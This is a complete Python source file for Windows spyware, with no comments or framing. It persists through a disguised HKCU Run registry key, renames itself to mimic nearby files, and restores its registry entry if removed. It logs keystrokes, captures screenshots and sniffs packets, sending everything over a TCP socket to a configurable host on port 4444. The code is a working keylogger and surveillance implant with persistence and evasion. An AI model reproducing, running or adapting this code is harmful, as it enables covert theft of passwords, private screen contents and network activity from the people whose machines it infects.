import os
import sys
import random
import time
import subprocess
import winreg
import socket
import pyautogui
from pynput import keyboard
from scapy.all import sniff
import threading
import io

TARGET_IP = "127.0.0.1"
TARGET_PORT = 4444
KEYLOG_DIR = r"C:\Users\<User>\Desktop"
SCREENSHOT_DIR = r"C:\Users\<User>\Desktop"
PACKETS_DIR = r"C:\Users\<User>\Desktop"
KEYLOG_INTERVAL = 10
SCREENSHOT_INTERVAL = 60
NETWORK_SNIFFER_TIMEOUT = 60

def insertRunValue(sScriptPath, sValueName):
    sRegistryKey = winreg.HKEY_CURRENT_USER
    sRunPath = r"Software\Microsoft\Windows\CurrentVersion\Run"
    xPythonExecutable = sys.executable.replace("python.exe", "pythonw.exe")
    sCommand = f'"{xPythonExecutable}" "{sScriptPath}" --startup"'
    with winreg.OpenKey(sRegistryKey, sRunPath, 0, winreg.KEY_ALL_ACCESS) as key:
        winreg.SetValueEx(key, sValueName, 0, winreg.REG_SZ, sCommand)

def getRunValues(sExcludedValueName=None):
    sRegistryKey = winreg.HKEY_CURRENT_USER
    sRunPath = r"Software\Microsoft\Windows\CurrentVersion\Run"
    sStartupValueNames = {}
    with winreg.OpenKey(sRegistryKey, sRunPath, 0, winreg.KEY_READ) as key:
        i = 0
        while True:
            try:
                sName, sValue, _ = winreg.EnumValue(key, i)
                if sName != sExcludedValueName:
                    sStartupValueNames[sName] = sValue
                i += 1
            except OSError:
                break
    return sStartupValueNames

def makeScriptName(sScriptPath, sExcludedFileName):
    sDirectory = os.path.dirname(sScriptPath)
    sExistingScriptNames = [
        f
        for f in os.listdir(sDirectory)
        if os.path.isfile(os.path.join(sDirectory, f)) and f != sExcludedFileName
    ]
    if not sExistingScriptNames:
        sName, sExtension = os.path.splitext(sExcludedFileName)
        return f"{sName}.{sExtension}"
    sSelectedFileName = random.choice(sExistingScriptNames)
    sName, sExtension = os.path.splitext(sSelectedFileName)
    return f"{sName}.{sExtension}"

def renameScript(sScriptPath):
    sNewScriptName = makeScriptName(sScriptPath, os.path.basename(sScriptPath))
    sNewScriptPath = os.path.join(os.path.dirname(sScriptPath), sNewScriptName)
    os.rename(sScriptPath, sNewScriptPath)
    return sNewScriptPath

def updateRunValue(file_path, app_name):
    insertRunValue(file_path, app_name)

def makeValueName(sStartupValueNames):
    if sStartupValueNames:
        return f"{random.choice(list(sStartupValueNames.keys()))}..."
    else:
        return "default"

def getCurrentValueName(sScriptPath):
    sRegistryKey = winreg.HKEY_CURRENT_USER
    sRunPath = r"Software\Microsoft\Windows\CurrentVersion\Run"
    xPythonExecutable = sys.executable.replace("python.exe", "pythonw.exe")
    sCommand = f'"{xPythonExecutable}" "{sScriptPath}" --startup"'
    with winreg.OpenKey(sRegistryKey, sRunPath, 0, winreg.KEY_READ) as key:
        i = 0
        while True:
            try:
                sName, sValue, _ = winreg.EnumValue(key, i)
                if sValue == sCommand:
                    return sName
                i += 1
            except OSError:
                break
    return None

def monitorRunKey(sScriptPath, sValueName):
    sRegistryKey = winreg.HKEY_CURRENT_USER
    sRunPath = r"Software\Microsoft\Windows\CurrentVersion\Run"
    xPythonExecutable = sys.executable.replace("python.exe", "pythonw.exe")
    sCommand = f'"{xPythonExecutable}" "{sScriptPath}" --startup"'
    try:
        with winreg.OpenKey(sRegistryKey, sRunPath, 0, winreg.KEY_ALL_ACCESS) as key:
            try:
                sValue = winreg.QueryValueEx(key, sValueName)[0]
                if sValue != sCommand:
                    winreg.SetValueEx(key, sValueName, 0, winreg.REG_SZ, sCommand)
            except FileNotFoundError:
                winreg.SetValueEx(key, sValueName, 0, winreg.REG_SZ, sCommand)
    except:
        pass

def exfil_data(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((TARGET_IP, TARGET_PORT))
            s.sendall(data)
    except:
        pass

def start_keylogger():
    current_log = []
    def on_press(key):
        special = None
        try:
            ch = key.char
            if ch is None:
                special = " " + str(key) + " "
            else:
                current_log.append(ch)
        except AttributeError:
            txt = str(key).lower()
            if txt == "key.enter":
                special = " (enter) "
            elif txt == "key.backspace":
                special = " (<) "
            elif txt == "key.space":
                special = " "
            elif "shift" in txt:
                special = " (shift) "
            elif "ctrl" in txt:
                special = " (ctrl) "
            else:
                special = " " + str(key) + " "
        if special:
            current_log.append(special)
    def record_loop():
        while True:
            stamp = time.strftime("%Y-%m-%d %H:%M:%S")
            time.sleep(KEYLOG_INTERVAL)
            if current_log:
                data = f"[keylog]{KEYLOG_DIR}\n[{stamp}] {''.join(current_log)}\n".encode()
                exfil_data(data)
                current_log.clear()
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    record_thread = threading.Thread(target=record_loop, daemon=True)
    record_thread.start()
    listener.join()

def capture_screenshots():
    while True:
        shot = pyautogui.screenshot()
        stamp = time.strftime("%Y%m%d_%H%M%S", time.localtime())
        stream = io.BytesIO()
        shot.save(stream, format="PNG")
        data = b"[screenshot]" + SCREENSHOT_DIR.encode() + b"\n" + stamp.encode() + b"\n" + stream.getvalue()
        exfil_data(data)
        stream.close()
        time.sleep(SCREENSHOT_INTERVAL)

def start_sniffer():
    def packet_callback(packet):
        stamp = time.strftime("%Y-%m-%d %H:%M:%S")
        data = f"[packets]{PACKETS_DIR}\n[{stamp}] {packet.summary()}\n".encode()
        exfil_data(data)
    sniff(prn=packet_callback, store=0, timeout=NETWORK_SNIFFER_TIMEOUT)

def main():
    sScriptPath = os.path.abspath(__file__)
    if "--startup" in sys.argv:
        sValueName = getCurrentValueName(sScriptPath)
        sUpdatedScriptPath = renameScript(sScriptPath)
        updateRunValue(sUpdatedScriptPath, sValueName)
        threading.Thread(target=start_keylogger, daemon=True).start()
        threading.Thread(target=capture_screenshots, daemon=True).start()
        threading.Thread(target=start_sniffer, daemon=True).start()
        while True:
            monitorRunKey(sUpdatedScriptPath, sValueName)
            time.sleep(10)
    else:
        sStartupValueNames = getRunValues()
        sValueName = makeValueName(sStartupValueNames)
        if not sStartupValueNames:
            sValueName = "default"
        insertRunValue(sScriptPath, sValueName)

if __name__ == "__main__":
    main()
